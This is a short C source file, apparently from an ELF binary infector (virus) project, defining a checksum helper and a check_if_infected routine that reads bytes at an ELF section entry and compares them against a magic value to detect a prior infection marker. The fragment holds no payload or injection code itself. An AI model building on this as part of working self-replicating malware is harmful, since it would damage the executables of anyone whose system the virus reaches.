
#include "infect.h"

static uint64_t	checksum(char *key)
{
	uint64_t	sum = 0;
	int64_t		keysize = 8;

	while (keysize--)
		sum += key[keysize];
	return sum;
}

bool	check_if_infected(const struct entry *original_entry, const struct safe_pointer info)
{
	const Elf64_Off		sh_offset = (original_entry->safe_shdr->sh_offset);
	const uint64_t		entry_offset = sh_offset + original_entry->offset_in_section;

	char			*entry = safe(entry_offset, 8);
	if (!entry) return false;

	if (checksum((char*)(entry + 56 + 5)) != 665) // TMP: some magic numbers here ..
		return true;

	return false;
}
